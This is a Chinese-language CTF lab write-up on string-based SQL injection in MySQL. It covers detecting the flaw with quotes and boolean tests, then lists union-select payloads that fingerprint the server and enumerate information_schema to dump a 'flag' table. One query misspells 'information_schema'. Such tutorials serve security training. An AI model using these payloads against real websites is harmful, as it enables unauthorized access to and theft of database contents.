---
title: ctfhub字符型注入
categories:
      - ctfhub
      - sql注入
---
# 一、判断是否存在注入

## 1、加单引号

此时sql 语句为：select * from table where name='admin''，由于加单引号后变成三个单引号，则无法执行，程序会报错；

## 2、加  ' and 1=1

此时sql 语句为：select * from table where name='admin' and 1=1' ，也无法进行注入

还需要通过注释符号将其绕过；Mysql 有三种常用注释符：

1. --
2. /**/
3. #

注意：--注释符后边有一个空格

因此，构造语句为：select * from table where name ='admin' and 1=1 -- ' 可成功执行返回结果正确；

## 3、加 'and 1=2 --

此时sql语句为：select * from table where name='admin' and 1=2 -- ' 则会报错

如果满足以上三点，可以判断该url为字符型注入。

服务端的sql语句为：select 列 from 数据库.表 where name='$name'

# 二、判断select语句中有几列

```sql
# 对字段进行排序，如果出现报错，则没有这个列
1' order by 3 --
```

# 三、判断显示的信息是第几列的信息

```sql
1' union select 1,2 -- '
```


# 四、利用函数来收集数据库信息

查询sql自带的函数来确定当前用户，当前数据库等信息。

数据库函数有以下：

1. 用户：user()
2. 当前数据库：database()
3. 数据库版本：version()
4. @@hostname （用户）
5. @@datadir   (数据库在文件的位置)
6. @@version  （版本)
7. @@version_compile_OS  (操作系统版本)


```sql
# 查询账户类型
1' union select 1,user() -- '

# 查询数据库类型
1' union select 1,version() -- '

# 查询当前数据库名称
1' union select 1,database() -- '
```


# 五、通过union查询数据库

```sql
# 获取所有数据库名称
1' union select 1,group_concat(schema_name) from information_schema.schemata -- '
# 查询数据库中有多少个表
1' union select table_schema,count(*) from information_schema.tables -- '
# 查询数据库information_schema中的所有表名
1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='informatioin_schema' -- '
# 查询指定数据库中的表名
1' union select table_schema, group_concat(table_name) from information_schema.tables where table_schema='sqli' -- '

# 查询指定数据库指定表中的列名
# 此次，通过limit逐个获取列名， limit 0,1，修改limit中第一个数字获取其他列名，如获取第二个列名：limit 1,1。
1' union select table_name,(select column_name from information_schema.columns where table_schema='sqli' and table_name='flag' limit 0,1) -- '

# 查询指定数据库指定表的列的内容
1' union select 1,group_concat(flag) from sqli.flag -- '
```
